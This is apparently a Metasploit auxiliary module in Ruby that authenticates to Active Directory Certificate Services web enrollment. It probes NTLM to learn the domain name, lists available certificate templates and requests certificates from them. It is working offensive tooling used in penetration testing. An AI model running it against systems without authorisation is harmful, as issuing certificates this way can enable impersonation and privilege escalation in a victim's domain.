##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::WebEnrollment
  include Msf::Auxiliary::Scanner

  def initialize(_info = {})
    super({
      'Name' => 'AD/CS Authenticated Web Enrollment Services Module',
      'Description' => %q{
        Authenticates to the AD/CS Web enrollment service and allows the user to query templates and create
        certificates based on available templates.
      },
      'Author' => [
        'bwatters-r7',
        'jhicks-r7', # query for available certs
        'Spencer McIntyre'
      ],
      'License' => MSF_LICENSE
    })

    register_options(
      [
        OptEnum.new('MODE', [ true, 'The issue mode.', 'SPECIFIC_TEMPLATE', %w[ALL QUERY_ONLY SPECIFIC_TEMPLATE]]),
        OptString.new('CERT_TEMPLATE', [ false, 'The template to issue if MODE is SPECIFIC_TEMPLATE.' ], conditions: %w[MODE == SPECIFIC_TEMPLATE]),
        OptString.new('TARGETURI', [ true, 'The URI for the cert server.', '/certsrv/' ])
      ]
    )
    @issued_certs = {}
  end

  def validate
    super
    case datastore['MODE']
    when 'SPECIFIC_TEMPLATE'
      if datastore['CERT_TEMPLATE'].blank?
        raise Msf::OptionValidateError.new({ 'CERT_TEMPLATE' => 'CERT_TEMPLATE must be set when MODE is SPECIFIC_TEMPLATE' })
      end
    when 'ALL', 'QUERY_ONLY'
      unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
        print_warning('CERT_TEMPLATE is ignored in ALL and QUERY_ONLY modes.')
      end
    end
    setup
  end

  def pull_domain(target_ip, target_uri)
    begin
      vprint_status("Checking #{target_ip} URL #{target_uri}")
      temp_username = datastore['HttpUsername']
      temp_password = datastore['HttpPassword']
      # datastore and options must be nil to fail login so we get ntlm challenge
      datastore['HttpUsername'] = nil
      datastore['HttpPassword'] = nil
      res = send_request_cgi({
        'rhost' => target_ip,
        'encode' => true,
        'username' => nil,
        'password' => nil,
        'uri' => normalize_uri(target_uri),
        'method' => 'GET',
        'headers' => { 'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==' }
      })
    rescue Errno::ENOPROTOOPT, Errno::ECONNRESET, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::ArgumentError
      vprint_error('Unable to Connect')
      return
    rescue ::Timeout::Error, ::Errno::EPIPE
      vprint_error('Timeout error')
      return
    end
    datastore['HttpUsername'] = temp_username
    datastore['HttpPassword'] = temp_password

    return nil if res.nil?

    unless res && res.code == 401
      print_bad("Incorrect status code returned checking for domain: #{res.code}")
    end
    unless res['WWW-Authenticate']
      print_bad('Target does not appear to support Windows Authentication.')
    end
    unless res['WWW-Authenticate'].match(/^NTLM/i)
      print_bad('Target does not appear to support NTLM.')
    end

    hash = res['WWW-Authenticate'].split('NTLM ')[1]
    # Parse out the NTLM and get the Target Information Data containing the domain name
    message = Net::NTLM::Message.parse(Base64.decode64(hash))
    ti = Net::NTLM::TargetInfo.new(message.target_info)
    ti.av_pairs[Net::NTLM::TargetInfo::MSV_AV_NB_DOMAIN_NAME]
  end

  def run_host(target_ip)
    validate
    if datastore['HTTP::Auth'] == 'ntlm' || datastore['HTTP::Auth'] == 'auto'
      queried_domain = pull_domain(target_ip, target_uri)
      if queried_domain.nil?
        fail_with(Failure::UnexpectedReply, 'Failed to automatically populate DOMAIN; please do so manually and retry')
      end

      # The queried_domain value is coming is as a UTF-16LE string encoded in ASCII 8-bit.
      # We need to normalize it so we can do the string compares later
      datastore_domain = datastore['DOMAIN']
      queried_domain.force_encoding('UTF-16LE')
      queried_domain = queried_domain.encode(datastore_domain.encoding)

      if datastore['DOMAIN'] != 'WORKSTATION' && queried_domain != datastore_domain
        fail_with(Failure::UnexpectedReply, "Server claims to be a member of #{queried_domain} domain and does not match the datastore domain entry #{datastore['DOMAIN']}")
      end
      connection_identity = queried_domain + '\\\\' + datastore['HttpUsername']
    end
    http_client = connect(
      {
        'rhost' => target_ip,
        'method' => 'GET',
        'uri' => normalize_uri(target_uri),
        'headers' => {
          'Accept-Encoding' => 'identity'
        }
      }
    )
    case datastore['MODE']
    when 'ALL', 'QUERY_ONLY'
      cert_templates = get_cert_templates(http_client)
      unless cert_templates.nil? || cert_templates.empty?
        print_status('***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***')
        print_good("Available Certificates for #{connection_identity} on #{datastore['RELAY_TARGET']}: #{cert_templates.join(', ')}")
        if datastore['MODE'] == 'ALL'
          retrieve_certs(target_ip, http_client, connection_identity, cert_templates)
        end
      end
    when 'SPECIFIC_TEMPLATE'
      cert_template = datastore['CERT_TEMPLATE']
      retrieve_cert(target_ip, http_client, connection_identity, cert_template)
    end
  end

end
